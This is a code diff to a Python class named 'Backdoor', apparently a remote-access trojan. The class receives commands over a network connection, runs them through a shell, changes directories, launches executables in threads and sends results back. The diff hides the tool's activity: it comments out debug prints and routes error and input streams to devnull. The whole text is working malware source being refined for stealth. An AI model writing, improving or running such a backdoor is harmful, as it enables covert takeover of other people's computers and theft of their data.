@@ -43,8 +43,9 @@ class Backdoor:
     
     def executeCmd(self,cmd):
         try:
-            cmd = subprocess.check_output(cmd,shell=True)
-            print(cmd)
+            DEVNULL = open(os.devnull,'wb')
+            cmd = subprocess.check_output(cmd,shell=True,stderr = DEVNULL,stdin = DEVNULL) #make sure this works, redirecting err and input to devnull
+            #print(cmd)
            
             return cmd
         except subprocess.CalledProcessError as e:
@@ -153,14 +154,14 @@ class Backdoor:
 
     def run(self):
         while True:
-            print('run1')
+            #print('run1')
             self.cmdIn = self.recvStream()
-            print(self.cmdIn) #list of the whole command output
+            #print(self.cmdIn) #list of the whole command output
     
             if self.cmdIn[0] == 'bye':
                 ###print('bye')
                 self.connection.close()
-                exit()
+                sys.exit()
             
             elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:  #meaning cmdIn = ['cd','c:\\'] is len() = 2
                 ###print('trying CD') 
@@ -188,13 +189,13 @@ class Backdoor:
                 self.sendStream(cmdOut)
 
             elif self.cmdIn[0] == 'execute':
-                print(f'Trying execute: {self.cmdIn[1]}') #should be the exe name
+                #print(f'Trying execute: {self.cmdIn[1]}') #should be the exe name
                 thread = threading.Thread(target=self.runExecutable,args=(self.cmdIn[1],))
                 thread.start()
                 self.sendStream(threading.enumerate())
                             
             else:   
-                print('Try execute cmd')
+                #print('Try execute cmd')
                 ###print('run3_PRE_TRY')
                 cmdOut = self.executeCmd(self.cmdIn)  
                 ###print(f'{cmdOut[1:20]},{type(cmdOut)}')
